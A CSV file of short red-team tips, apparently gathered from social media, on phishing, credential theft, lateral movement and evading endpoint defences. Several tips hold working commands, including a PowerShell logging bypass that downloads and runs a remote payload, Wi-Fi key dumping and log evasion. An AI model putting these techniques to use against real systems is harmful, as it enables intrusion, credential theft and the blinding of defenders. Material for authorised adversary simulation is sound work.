tipid,a,b,line
150,Make sure phishing emails Bounce header matches From. Or else some will flag as malicious.,,Make sure phishing emails Bounce header matches From. Or else some will flag as malicious.
151,DomainHunter also looks for good candidate expired domains - https://github.com/minisllc/domainhunter,,DomainHunter also looks for good candidate expired domains - https://github.com/minisllc/domainhunter
152,Want to scrape MetaData in CLI? Use PowerMeta. Linux users can use PowerShell too! https://github.com/dafthack/PowerMeta,,Want to scrape MetaData in CLI? Use PowerMeta. Linux users can use PowerShell too! https://github.com/dafthack/PowerMeta
153,RDP in use? Dont want to use VNC? Try mimikatzs ts::multirdp in memory patch by @gentilkiwi,,RDP in use? Dont want to use VNC? Try mimikatzs ts::multirdp in memory patch by @gentilkiwi
154,Admin on a machine with VPN client? certificate extraction using Mimikatz by @gentilkiwi. Dont forget to dl configs. Backdoor,,Admin on a machine with VPN client? certificate extraction using Mimikatz by @gentilkiwi. Dont forget to dl configs. Backdoor
155,"Master all the quick wins to Domain privilege escalation. When youre pressured to get DA in 15 mins, you want to know you can",,"Master all the quick wins to Domain privilege escalation. When youre pressured to get DA in 15 mins, you want to know you can"
156,@Akijos notes that we should be careful when using silver tickets with scheduled tasks. Author is the user account youre on.,,@Akijos notes that we should be careful when using silver tickets with scheduled tasks. Author is the user account youre on.
157,"If you dont need a golden ticket, dont generate it.",,"If you dont need a golden ticket, dont generate it."
158,"Scan a DNS server for Alexa top 1 million spoofable domains :) Ive got a massive list, do you?",,"Scan a DNS server for Alexa top 1 million spoofable domains :) Ive got a massive list, do you?"
159,Scan the internet for a list of domain frontable domains! Ive got a big big list ready for whenever I want to use them :),,Scan the internet for a list of domain frontable domains! Ive got a big big list ready for whenever I want to use them :)
160,We all know people share credentials between different services. Try these credentials on other accounts owned by the user!,,We all know people share credentials between different services. Try these credentials on other accounts owned by the user!
161,Cant crack a password? Try the users previous passwords from history in AD. They may follow a pattern.,,Cant crack a password? Try the users previous passwords from history in AD. They may follow a pattern.
162,Cant crack a hash owned by a user? Take all previously discovered passwords from their files and generate a new word list.,,Cant crack a hash owned by a user? Take all previously discovered passwords from their files and generate a new word list.
163,Cant crack a password? Make sure these are in your word list,"name of company, town, capital, country, months! Appear a lot.","Cant crack a password? Make sure these are in your word list name of company, town, capital, country, months! Appear a lot."
164,Didier Stevens has SelectMyParent tool that lets you spawn a child process with an arbitrary parent. https://blog.didierstevens.com/2017/03/20/that-is-not-my-child-process/,,Didier Stevens has SelectMyParent tool that lets you spawn a child process with an arbitrary parent. https://blog.didierstevens.com/2017/03/20/that-is-not-my-child-process/
165,Using SelectMyParent stops those detections eg. powershell.exe spawning cmd.exe. @armitagehackers CobaltStrike has ppid cmd!,,Using SelectMyParent stops those detections eg. powershell.exe spawning cmd.exe. @armitagehackers CobaltStrike has ppid cmd!
166,Use PowerPoint mouse over text to invoke a powershell command one liner. #adversarysimulation - https://www.dodgethissecurity.com/2017/06/02/new-powerpoint-mouseover-based-downloader-analysis-results/,,Use PowerPoint mouse over text to invoke a powershell command one liner. #adversarysimulation - https://www.dodgethissecurity.com/2017/06/02/new-powerpoint-mouseover-based-downloader-analysis-results/
167,Follow @mattifestation to keep up to date with blue team advances. Just in case blue is actually up to date with mitigations!,,Follow @mattifestation to keep up to date with blue team advances. Just in case blue is actually up to date with mitigations!
168,Using VBS or JS? Cant stage using PowerShell.exe as blocked? @Cneelis released https://github.com/Cn33liz/StarFighters so you can keep use PS,,Using VBS or JS? Cant stage using PowerShell.exe as blocked? @Cneelis released https://github.com/Cn33liz/StarFighters so you can keep use PS
169,Not sure who uses Wi-Fi webcams but go run a mass deauth attack if youre going to plan on breaking in physically to discon,,Not sure who uses Wi-Fi webcams but go run a mass deauth attack if youre going to plan on breaking in physically to discon
170,@malcomvetter Never use defaults - run Mimikatz with AES and 8 hour tickets to avoid passive detection from NG defense tools!,,@malcomvetter Never use defaults - run Mimikatz with AES and 8 hour tickets to avoid passive detection from NG defense tools!
171,Win XP doesnt have PowerShell? Try using Unmanaged powershell to keep using your favourite scripts!,,Win XP doesnt have PowerShell? Try using Unmanaged powershell to keep using your favourite scripts!
172,@anthonykasza tells us that the at.exe command takes base64 encoded Params! Eg. at.exe b64::[encoded params],,@anthonykasza tells us that the at.exe command takes base64 encoded Params! Eg. at.exe b64::[encoded params]
173,Grab cleartext wireless keys,"netsh wlan show profile name=""ssid"" key=clear","Grab cleartext wireless keys netsh wlan show profile name=""ssid"" key=clear"
174,Got a shell on a victim without admin? Want their creds? Try Inveigh then rpcping -s 127.0.0.1 -t ncacn_np to leak hash.,,Got a shell on a victim without admin? Want their creds? Try Inveigh then rpcping -s 127.0.0.1 -t ncacn_np to leak hash.
175,Got a low priv shell and need creds? Use Invoke-LoginPrompt by @enigma0x3 https://raw.githubusercontent.com/enigma0x3/Invoke-LoginPrompt/master/Invoke-LoginPrompt.ps1,,Got a low priv shell and need creds? Use Invoke-LoginPrompt by @enigma0x3 https://raw.githubusercontent.com/enigma0x3/Invoke-LoginPrompt/master/Invoke-LoginPrompt.ps1
176,"Get access to shadow admin accounts, they can DCsync and are essentially DA. https://www.cyberark.com/threat-research-blog/shadow-admins-stealthy-accounts-fear/",,"Get access to shadow admin accounts, they can DCsync and are essentially DA. https://www.cyberark.com/threat-research-blog/shadow-admins-stealthy-accounts-fear/"
177,If blue detects PTH. Try extract Kerberos tickets and PTT.,,If blue detects PTH. Try extract Kerberos tickets and PTT.
178,@lefterispan wrote https://gist.github.com/leftp/a3330f13ac55f584239baa68a3bb88f2 â€¦ which sets up a proxy and forces an auth attempt to it to leak hash. Low priv leak.,,@lefterispan wrote https://gist.github.com/leftp/a3330f13ac55f584239baa68a3bb88f2 â€¦ which sets up a proxy and forces an auth attempt to it to leak hash. Low priv leak.
179,"When creating phishing pages, try cloning and modifying parts of the client's own webpages. For example of their VPN login!",,"When creating phishing pages, try cloning and modifying parts of the client's own webpages. For example of their VPN login!"
180,Regardless of whether there are known defences. Run your PS scripts through Obfuscation before loading into memory.,,Regardless of whether there are known defences. Run your PS scripts through Obfuscation before loading into memory.
181,Stuck trying to find those assets still? Try @424f424f Get-BrowserData https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1,,Stuck trying to find those assets still? Try @424f424f Get-BrowserData https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1
182,Follow @JohnLaTwC as he tweets phishing examples and sometimes with new techniques used in Wild. Good for adversary simulation,,Follow @JohnLaTwC as he tweets phishing examples and sometimes with new techniques used in Wild. Good for adversary simulation
183,@MrUn1k0d3r released https://github.com/Mr-Un1k0d3r/SCT-obfuscator â€¦ can probably bypass Gateway signatures when performing SCT delivery for regsvr32! https://github.com/Mr-Un1k0d3r/SCT-obfuscator,,@MrUn1k0d3r released https://github.com/Mr-Un1k0d3r/SCT-obfuscator â€¦ can probably bypass Gateway signatures when performing SCT delivery for regsvr32! https://github.com/Mr-Un1k0d3r/SCT-obfuscator
184,We always talk about Windows and AD. But now let's have a look at Linux and AD with https://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9,,We always talk about Windows and AD. But now let's have a look at Linux and AD with https://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9
185,Use WSUS for lateral movement https://github.com/AlsidOfficial/WSUSpendu/blob/master/WSUSpendu.ps1,,Use WSUS for lateral movement https://github.com/AlsidOfficial/WSUSpendu/blob/master/WSUSpendu.ps1
186,View @jpcert https://www.jpcert.or.jp/english/pub/sr/20170612ac-ir_research_en.pdf â€¦ and look at all those indicators and artefacts left behind. Then hexedit those tools ?,,View @jpcert https://www.jpcert.or.jp/english/pub/sr/20170612ac-ir_research_en.pdf â€¦ and look at all those indicators and artefacts left behind. Then hexedit those tools ?
187,Found a portal using 2FA? Using RSA SecureID? https://blog.netspi.com/targeting-rsa-emergency-access-tokencodes-fun-profit/ â€¦ Pin bruteforce!,,Found a portal using 2FA? Using RSA SecureID? https://blog.netspi.com/targeting-rsa-emergency-access-tokencodes-fun-profit/ â€¦ Pin bruteforce!
188,@pwnagelabs says to avoid bash history on exit using,kill -9 $$,@pwnagelabs says to avoid bash history on exit using kill -9 $$
189,@pwnagelabs teaches us how to avoid wtmp logging with,ssh -l user target -T,@pwnagelabs teaches us how to avoid wtmp logging with ssh -l user target -T
190,@bluscreenofjeff shows us how to use Apache Mod rewrite to randomly serve different payloads https://bluescreenofjeff.com/2017-06-13-serving-random-payloads-with-apache-mod_rewrite/,,@bluscreenofjeff shows us how to use Apache Mod rewrite to randomly serve different payloads https://bluescreenofjeff.com/2017-06-13-serving-random-payloads-with-apache-mod_rewrite/
191,"Domain user? Query LDAP for Printers. Attempt default creds or known vulns then read Service account creds, hash or relay",,"Domain user? Query LDAP for Printers. Attempt default creds or known vulns then read Service account creds, hash or relay"
192,Get-WmiObject -Class MicrosoftDNS_AType -NameSpace Root\MicrosoftDNS -ComputerName DC001 | Export-CSV -not dns.csv,,Get-WmiObject -Class MicrosoftDNS_AType -NameSpace Root\MicrosoftDNS -ComputerName DC001 | Export-CSV -not dns.csv
193,Password protected doc in email? For some reason a lot of people send the password separately to the same inbox. #epicfail,,Password protected doc in email? For some reason a lot of people send the password separately to the same inbox. #epicfail
194,Can't see another part of the network and there's a DC? Pivot off the DC :),,Can't see another part of the network and there's a DC? Pivot off the DC :)
195,C:\windows\system32\inetsrv\appcmd list site to find IIS bindings.,,C:\windows\system32\inetsrv\appcmd list site to find IIS bindings.
196,DA -> Locate DB -> Found MSSQL? https://github.com/NetSPI/PowerUpSQL use PowerUpSQL to enumerate and privesc by stealing tokens.,,DA -> Locate DB -> Found MSSQL? https://github.com/NetSPI/PowerUpSQL use PowerUpSQL to enumerate and privesc by stealing tokens.
197,"If ACL doesn't let you read other users' home shares, you can try net view \\fileserv /all to try other shares and folders!",,"If ACL doesn't let you read other users' home shares, you can try net view \\fileserv /all to try other shares and folders!"
198,Username jondoe and jondoe-x? Ones an Admin? Try same password. May be shared ? repeat for entire user list.,,Username jondoe and jondoe-x? Ones an Admin? Try same password. May be shared ? repeat for entire user list.
199,Failed to phish? Payloads failing? Mac users? Write an email and ask them to open terminal and paste in python Empyre one line,,Failed to phish? Payloads failing? Mac users? Write an email and ask them to open terminal and paste in python Empyre one line
200,@_wald0 blessed us with this BH cypher query to skip specific nodes to look for other paths. https://pastebin.com/qAzH9uji,,@_wald0 blessed us with this BH cypher query to skip specific nodes to look for other paths. https://pastebin.com/qAzH9uji
201,@424f424f pushed some research into LNK files inside CAB can be used to bypass the Attachment Manager ?http://www.rvrsh3ll.net/blog/informational/bypassing-windows-attachment-manager/,,@424f424f pushed some research into LNK files inside CAB can be used to bypass the Attachment Manager ?http://www.rvrsh3ll.net/blog/informational/bypassing-windows-attachment-manager/
202,"When domain fronting, your calls hit the edge node, so every domain you use potentially hits a different a IP! ?",,"When domain fronting, your calls hit the edge node, so every domain you use potentially hits a different a IP! ?"
203,"If using @Cneelis StarFighter. Instead of using a staged web delivery, just stick while stageless payload as encoded block in!",,"If using @Cneelis StarFighter. Instead of using a staged web delivery, just stick while stageless payload as encoded block in!"
204,Printers are often good MAC addresses to use to beat NAC when physical red teaming as printers (mostly?) don't support 802.1x,,Printers are often good MAC addresses to use to beat NAC when physical red teaming as printers (mostly?) don't support 802.1x
205,"If proxy is blocking SCT file, replace <scriptlet> with <package> and add <component id=""test""> around the rest. Thx @subTee",,"If proxy is blocking SCT file, replace <scriptlet> with <package> and add <component id=""test""> around the rest. Thx @subTee"
206,CobaltStrike's @armitagehacker VNC not working? Here's a workaround using @artkond Invoke-VNC https://github.com/vysec/Aggressor-VYSEC/blob/master/vnc-psh.cna,,CobaltStrike's @armitagehacker VNC not working? Here's a workaround using @artkond Invoke-VNC https://github.com/vysec/Aggressor-VYSEC/blob/master/vnc-psh.cna
207,Got C2 on Windows user but no credentials? Leak a hash using @leftp's code. Implemented into CNA https://github.com/vysec/Aggressor-VYSEC/blob/master/Invoke-CredLeak.ps1,,Got C2 on Windows user but no credentials? Leak a hash using @leftp's code. Implemented into CNA https://github.com/vysec/Aggressor-VYSEC/blob/master/Invoke-CredLeak.ps1
208,@Nebulator spoke on IP regex by IR at #SnoopCon. Here's CobaltStrike @armitagehacker CNA to automate https://github.com/vysec/Aggressor-VYSEC/blob/master/ping.cna,,@Nebulator spoke on IP regex by IR at #SnoopCon. Here's CobaltStrike @armitagehacker CNA to automate https://github.com/vysec/Aggressor-VYSEC/blob/master/ping.cna
209,Automate environment prepping and spawn all processes as a child of explorer.exe by @armitagehacker https://github.com/vysec/Aggressor-VYSEC/blob/master/auto-prepenv.cna,,Automate environment prepping and spawn all processes as a child of explorer.exe by @armitagehacker https://github.com/vysec/Aggressor-VYSEC/blob/master/auto-prepenv.cna
210,@subTee highlighted to us that XML requests can be used as a download cradle in constrained language mode!,,@subTee highlighted to us that XML requests can be used as a download cradle in constrained language mode!
211,Check out @armitagehacker's post on OPSEC considerations when using Cobalt Strike's beacon. https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/,,Check out @armitagehacker's post on OPSEC considerations when using Cobalt Strike's beacon. https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/
212,Reset AD passwords from Linux with @mubix https://room362.com/post/2017/reset-ad-user-password-with-linux/ :) proxychains it over your pivot :D,,Reset AD passwords from Linux with @mubix https://room362.com/post/2017/reset-ad-user-password-with-linux/ :) proxychains it over your pivot :D
213,Got a NetNTLMv1 hash? Convert it to NTLM by cracking three DES keys,https://hashcat.net/forum/thread-5912.html,Got a NetNTLMv1 hash? Convert it to NTLM by cracking three DES keys https://hashcat.net/forum/thread-5912.html
214,If you don't 100 percent understand NETNTLMv1 and v2 read up on https://blog.smallsec.ca/2016/11/21/ntlm-challenge-response/,,If you don't 100 percent understand NETNTLMv1 and v2 read up on https://blog.smallsec.ca/2016/11/21/ntlm-challenge-response/
215,If you don't know how LM and NTLM hashing works... go back to basics with https://blog.smallsec.ca/2016/11/07/windows-credentials/,,If you don't know how LM and NTLM hashing works... go back to basics with https://blog.smallsec.ca/2016/11/07/windows-credentials/
216,@424f424f just made me aware that FireEye can prevent runas from executing. Use unmanaged PS to spawn https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/RunAs.ps1,,@424f424f just made me aware that FireEye can prevent runas from executing. Use unmanaged PS to spawn https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/RunAs.ps1
217,S4U can be used to delegate across SPN. So if you have msds-allowedtodelagateto HTTP you can exploit to obtain HOST and CIFS,,S4U can be used to delegate across SPN. So if you have msds-allowedtodelagateto HTTP you can exploit to obtain HOST and CIFS
218,You're in a subnet where people RDP into but you can't attack outwards? Set backdoor over tsclient on start keys. ?,,You're in a subnet where people RDP into but you can't attack outwards? Set backdoor over tsclient on start keys. ?
219,Unsure what the localised admin account might be called or need to copy and paste? Check out https://social.technet.microsoft.com/wiki/contents/articles/13813.localized-names-for-administrator-account-in-windows.aspx,,Unsure what the localised admin account might be called or need to copy and paste? Check out https://social.technet.microsoft.com/wiki/contents/articles/13813.localized-names-for-administrator-account-in-windows.aspx
220,EDR monitoring whoami? Use echo %userprofile% echo %username% Or replace echo with anything that reflects error,ie. set,EDR monitoring whoami? Use echo %userprofile% echo %username% Or replace echo with anything that reflects error ie. set
221,"Network segregation in play? Try Get-NetSubnet, Get-NetSite in PowerView or browse in AD explorer. Can help find your way :)",,"Network segregation in play? Try Get-NetSubnet, Get-NetSite in PowerView or browse in AD explorer. Can help find your way :)"
222,"If you want to simulate MBR activity like #Petya, check out https://github.com/PowerShellMafia/PowerSploit/blob/master/Mayhem/Mayhem.psm1",,"If you want to simulate MBR activity like #Petya, check out https://github.com/PowerShellMafia/PowerSploit/blob/master/Mayhem/Mayhem.psm1"
223,Secure your beach heads against #Petya WMIC /node:host process call create â€œecho > C:\windows\perfcâ€,,Secure your beach heads against #Petya WMIC /node:host process call create â€œecho > C:\windows\perfcâ€
224,Using Linux? Modify /etc/dhcp/dhclient.conf and remove gethostname() for Opsec when you VPN or have to rock up on site.,,Using Linux? Modify /etc/dhcp/dhclient.conf and remove gethostname() for Opsec when you VPN or have to rock up on site.
225,Stuck in a heavily segregated situation on a server? Try RDPInception attack vector out https://www.mdsec.co.uk/2017/06/rdpinception/,,Stuck in a heavily segregated situation on a server? Try RDPInception attack vector out https://www.mdsec.co.uk/2017/06/rdpinception/
226,Reduce AV detection by using fake Microsoft certificate.,,Reduce AV detection by using fake Microsoft certificate.
227,Not using notifications yet for C2 events? For @armitagehacker's Cobalt Strike check out https://github.com/Und3rf10w/Aggressor-scripts,,Not using notifications yet for C2 events? For @armitagehacker's Cobalt Strike check out https://github.com/Und3rf10w/Aggressor-scripts
228,Using PowerShell?,,"Using PowerShell? # ScriptBlock Logging Bypass
# @cobbr_io
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').""GetFie`ld""('cachedGroupPolicySettings', 'N'+'onPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
iex (New-Object Net.WebClient).downloadstring(""https://myserver/mypayload.ps1"")
Can help you Bypass ScriptBlock Logging for added OpSec :)"
229,"If you can't use Reg class in WMI to exfil in CLM, use @christruncer's OSRecoveryConfiguration! Examples in WMI Implant.",,"If you can't use Reg class in WMI to exfil in CLM, use @christruncer's OSRecoveryConfiguration! Examples in WMI Implant."
230,Sandbox Analysis taking place? @arvanaghi has a centralised repo of anti sandbox techniques https://github.com/Arvanaghi/CheckPlease,,Sandbox Analysis taking place? @arvanaghi has a centralised repo of anti sandbox techniques https://github.com/Arvanaghi/CheckPlease
231,"When facing Sandboxes, learn about filetypes and limitations. Dropped some examples at @Steel_Con and even more at @HITBGSEC!",,"When facing Sandboxes, learn about filetypes and limitations. Dropped some examples at @Steel_Con and even more at @HITBGSEC!"
231,@ropnop wrote https://gist.github.com/ropnop/8711392d5e1d9a0ba533705f7f4f455f â€¦ to perform Kerberos TGT password bruteforce. Potentially stealthier than traditional SMB,,@ropnop wrote https://gist.github.com/ropnop/8711392d5e1d9a0ba533705f7f4f455f â€¦ to perform Kerberos TGT password bruteforce. Potentially stealthier than traditional SMB
231,"Admin to machine X? X has SPN set to delegate access? Bam! Hit machine X, you don't need to crack no machine hash.",,"Admin to machine X? X has SPN set to delegate access? Bam! Hit machine X, you don't need to crack no machine hash."
232,Low privilege prevent ATP sending logs? Modify registry and serve WPAD locally to not send data to Msft Domains. @retBandit,,Low privilege prevent ATP sending logs? Modify registry and serve WPAD locally to not send data to Msft Domains. @retBandit
232,CACTUSTORCH introduces a new set of TTP in Payload Generation. https://github.com/mdsecactivebreach/CACTUSTORCH â€¦ Reduces signature footprints too!,,CACTUSTORCH introduces a new set of TTP in Payload Generation. https://github.com/mdsecactivebreach/CACTUSTORCH â€¦ Reduces signature footprints too!
233,Looking for a decent domain but need to force categorisation? Check out https://github.com/mdsecactivebreach/Chameleon â€¦! - abuses bugs in proxies ???,,Looking for a decent domain but need to force categorisation? Check out https://github.com/mdsecactivebreach/Chameleon â€¦! - abuses bugs in proxies ???
233,Use WSUSPENDU to move laterally with fake updates even across airgapped environments.,,Use WSUSPENDU to move laterally with fake updates even across airgapped environments.
234,"Instead of using rundll32, try control @domchell and winword /L @subTee ? change indicators!",,"Instead of using rundll32, try control @domchell and winword /L @subTee ? change indicators!"
234,Typo squat domains or names containing the target company name might be monitored by registration watch lists.,,Typo squat domains or names containing the target company name might be monitored by registration watch lists.
235,Doing many concurrent adversary simulation gigs? Automate the boring target collection process with https://www.mdsec.co.uk/2017/07/reconnaissance-using-linkedint/,,Doing many concurrent adversary simulation gigs? Automate the boring target collection process with https://www.mdsec.co.uk/2017/07/reconnaissance-using-linkedint/
235,"When deploying infrastructure, aim to have distinct sets that should not allow for correlation to each other.",,"When deploying infrastructure, aim to have distinct sets that should not allow for correlation to each other."
236,Blue looking for net users /domain? Try out n^eT^1 us^er^s /do,,Blue looking for net users /domain? Try out n^eT^1 us^er^s /do
236,"In malware delivery, add user identifiable trackers in the execution container to ensure that further steps not failing.",,"In malware delivery, add user identifiable trackers in the execution container to ensure that further steps not failing."
237,Use SLK files instead of XLS for Excel DDE code exec without protected view issues. Discovered by @enigma0x3,,Use SLK files instead of XLS for Excel DDE code exec without protected view issues. Discovered by @enigma0x3
237,Limiting allowed inbound IP ranges using iptables will restrict the ability for external IR teams to fetch payloads or stage,,Limiting allowed inbound IP ranges using iptables will restrict the ability for external IR teams to fetch payloads or stage
238,Keying implants will reduce the likelihood of execution if any keyed item is incorrect. In long operations useful for stealth.,,Keying implants will reduce the likelihood of execution if any keyed item is incorrect. In long operations useful for stealth.
238,ATP? sc stop diagtrack,,ATP? sc stop diagtrack
239,Over PTH? Use all AES RC4 NTLM.,,Over PTH? Use all AES RC4 NTLM.
239,Finding zero day DLL hijacks with Rattler can be useful for stealthier long term persistence.,,Finding zero day DLL hijacks with Rattler can be useful for stealthier long term persistence.
240,Don't use remote exploitation where possible as IDS will often flag on such attempts.,,Don't use remote exploitation where possible as IDS will often flag on such attempts.
241,Local exploitation may be flagged by endpoint security although less likely.,,Local exploitation may be flagged by endpoint security although less likely.
242,Exploits such as MS17-010 can be routed internally for privilege escalation using portforwards. Lowers risk of IDS detections.,,Exploits such as MS17-010 can be routed internally for privilege escalation using portforwards. Lowers risk of IDS detections.
243,"ATA detects where tools such as UserHunter or BloodHound query AD. Instead, blacklist DCs. Use file shares / high pop servers.",,"ATA detects where tools such as UserHunter or BloodHound query AD. Instead, blacklist DCs. Use file shares / high pop servers."
244,Use WMI or WinAPI calls to perform host recon when up against ATP.,,Use WMI or WinAPI calls to perform host recon when up against ATP.
245,PowerShell Injection Vulnerability Hunter can be integrated into VSCode. Start writing secure offensive PowerShell? ?,,PowerShell Injection Vulnerability Hunter can be integrated into VSCode. Start writing secure offensive PowerShell? ?
246,Be extremely cautious when generating tickets and remember to use AES hashes as default good practice where possible.,,Be extremely cautious when generating tickets and remember to use AES hashes as default good practice where possible.
247,"Wiki, sharepoint, intranet, fileshares often have access control misconfigs. Almost as good as privilege escalation for info.",,"Wiki, sharepoint, intranet, fileshares often have access control misconfigs. Almost as good as privilege escalation for info."
248,@_staaldraad Phishing with OAuth http://staaldraad.github.io/pentest/phishing/2017/08/02/o356-phishing-with-oauth/,,@_staaldraad Phishing with OAuth http://staaldraad.github.io/pentest/phishing/2017/08/02/o356-phishing-with-oauth/
249,Obfuscate your macro documents with @MrUn1k0d3râ€˜s https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator,,Obfuscate your macro documents with @MrUn1k0d3râ€˜s https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator
250,Need fast and accurate execution of BloodHound attack paths? try out https://github.com/vysec/ANGRYPUPPY â€¦ by @vysecurity and @001SPARTaN,,Need fast and accurate execution of BloodHound attack paths? try out https://github.com/vysec/ANGRYPUPPY â€¦ by @vysecurity and @001SPARTaN
251,https://github.com/ramen0x3f/AggressorScripts/blob/master/credpocalypse.cna â€¦ can be set on high volume servers to make sure you get all the credentials ;D @ramen0x3f,,https://github.com/ramen0x3f/AggressorScripts/blob/master/credpocalypse.cna â€¦ can be set on high volume servers to make sure you get all the credentials ;D @ramen0x3f
252,PyBrute for Recon (now reconned) by @OrOneEqualsOne https://github.com/OrOneEqualsOne/reconned â€¦ Good for enumeration of subdomains :),,PyBrute for Recon (now reconned) by @OrOneEqualsOne https://github.com/OrOneEqualsOne/reconned â€¦ Good for enumeration of subdomains :)
253,@MrUn1k0d3r releases UniByAv. XOR encrypts shellcode and then does Hyperion type brute force to break the key. ? FUD FUD FUD,,@MrUn1k0d3r releases UniByAv. XOR encrypts shellcode and then does Hyperion type brute force to break the key. ? FUD FUD FUD
Red tip,Use @armitagehacker's CobaltStrike? I'd be careful with NOD32 as it seems to be detecting ElevateKit's use of Powerpick & UacBypass,,Use @armitagehacker's CobaltStrike? I'd be careful with NOD32 as it seems to be detecting ElevateKit's use of Powerpick & UacBypass
254,Load arbitrary DLL from xwizard.exe by @Hexacorn http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/,,Load arbitrary DLL from xwizard.exe by @Hexacorn http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/
255,Use rundll32.exe a lot? Try copy it to another directory to appear as diff name. http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/,,Use rundll32.exe a lot? Try copy it to another directory to appear as diff name. http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/
256,"Use Cloud Hosts / CDNs for redirectors. Unless the cloud provider sells you out, they have no way to find out where the c2 is.",,"Use Cloud Hosts / CDNs for redirectors. Unless the cloud provider sells you out, they have no way to find out where the c2 is."
257,scans.io has some pretty good databases for a list of subdomains potentially for your target. Use the SQL AXFR one!,,scans.io has some pretty good databases for a list of subdomains potentially for your target. Use the SQL AXFR one!
258,"If you're using a domain with the bank's name in it, be careful when registering SSL certs, may get flagged on watch list.",,"If you're using a domain with the bank's name in it, be careful when registering SSL certs, may get flagged on watch list."
259,Payloads served via email links and attachments being sandboxes? Try sending payloads via. direct Skype messages! ?,,Payloads served via email links and attachments being sandboxes? Try sending payloads via. direct Skype messages! ? Red tip - sign up for @VirusTotal intelligence (easy if your company has others using it) - create YARA rules for your domains/tools/handle
260,"Enumerate DevOps stack, WSUS, Endpoint security agents - use these to jump into segregated zones.",,"Enumerate DevOps stack, WSUS, Endpoint security agents - use these to jump into segregated zones."
261,"Once again. Never forget SharePoint, easy search functionality and often yields good results.",,"Once again. Never forget SharePoint, easy search functionality and often yields good results."
262,@_rastamouse shows you how to manually extract relevant RDP credentials from Cred Vault in his labs! https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/,,@_rastamouse shows you how to manually extract relevant RDP credentials from Cred Vault in his labs! https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/
263,Use lsadump::dcsync /all /csv in Mimikatz to perform DRSUAPI grabbing of all hashes! Nice.,,Use lsadump::dcsync /all /csv in Mimikatz to perform DRSUAPI grabbing of all hashes! Nice.
264,"SMB leaking fails if proper network segregation. Thank humans for laptops, work from home, cafes and free wifi! @haifeili",,"SMB leaking fails if proper network segregation. Thank humans for laptops, work from home, cafes and free wifi! @haifeili"
265,Domain Fronting Domain lists for popular CDNs can be found at,https://github.com/vysec/DomainFrontingLists â€¦ good for defenders too!,Domain Fronting Domain lists for popular CDNs can be found at https://github.com/vysec/DomainFrontingLists â€¦ good for defenders too!
266,"When performing physical social engineering, don't forget to pretend to actually scan your ID when tailgating",,"When performing physical social engineering, don't forget to pretend to actually scan your ID when tailgating"
267,Using HTAs? Follow @enigma0x3 to keep up-to-date with his discovery of monikers to spawn under different parent processes.,,Using HTAs? Follow @enigma0x3 to keep up-to-date with his discovery of monikers to spawn under different parent processes.
268,Review every column in the DB. Sometimes your objective is mislabeled or hiding in a big table. @malcomvetter,,Review every column in the DB. Sometimes your objective is mislabeled or hiding in a big table. @malcomvetter
269,Remove all document information when creating your Macros. You can even edit the file to put in false attribution data.,,Remove all document information when creating your Macros. You can even edit the file to put in false attribution data.
270,Block common security vendors from grabbing your link payloads https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10,,Block common security vendors from grabbing your link payloads https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10. 
